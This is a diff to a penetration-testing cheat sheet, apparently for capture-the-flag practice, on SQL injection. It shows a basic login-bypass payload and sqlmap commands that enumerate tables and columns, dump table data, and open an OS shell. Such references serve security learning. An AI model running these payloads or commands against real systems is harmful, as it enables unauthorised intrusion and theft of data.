@@ -51,6 +51,8 @@ Useful nmap scripts:
 
 # SQL Injection
 
+For SQL injection focused task either perform the injection manually or use sqlmap tool. Check fields using single quote or encoded single quote.
+
 ```blah' or 1=1 --``` - Basic login bypass payload.
 
 <details>
@@ -60,7 +62,11 @@ Useful nmap scripts:
 
 ```sudo sqlmap -u “[URL]” -D [database_name] --tables``` - Enumerate tables in the specified database (--tables).
 
-```sqlmap -u “[URL]” -D [database_name] -T [table_name] --columns``` - Enumerate columns in the specified table (--columns).
+```sudo sqlmap -u “[URL]” -D [database_name] -T [table_name] --columns``` - Enumerate columns in the specified table (--columns).
+
+```sudo sqlmap -u “[URL]” -D [database_name] -T [table_name] --dump``` - Dump all data from table (--dump).
+
+```sqlmap -u “[URL]” --os-shell``` - Pop shell through sqlmap (--os-shell).
 
 </details>
 
